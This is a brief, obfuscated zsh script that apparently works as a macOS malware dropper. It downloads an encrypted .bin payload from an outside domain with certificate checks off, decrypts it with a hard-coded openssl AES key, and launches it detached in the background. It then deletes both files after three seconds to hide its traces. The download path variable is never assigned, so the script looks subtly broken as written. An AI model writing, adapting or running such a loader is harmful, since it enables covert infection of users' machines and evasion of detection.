#!/bin/zsh
vg33r=$(mktemp /tmp/fv49x6.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m529ac1c3bf945c15.bin" -o "$vg33rz" || exit 1
ewnkph=$(stat -f %z "$vg33rz"); d3xksd3=$(( ewnkph - 3791 - 3012 ))
tail -c +$(( 3791 + 1 )) "$vg33rz" | head -c $d3xksd3 | openssl enc -d -aes-256-cbc -k e14e0ae53df0a1f601b8aa07 -out "$vg33r" 2>/dev/null
[ -s "$vg33r" ] && chmod 700 "$vg33r" && ( "$vg33r" & ) && disown
( sleep 3; rm -f "$vg33r" "$vg33rz" ) &>/dev/null &
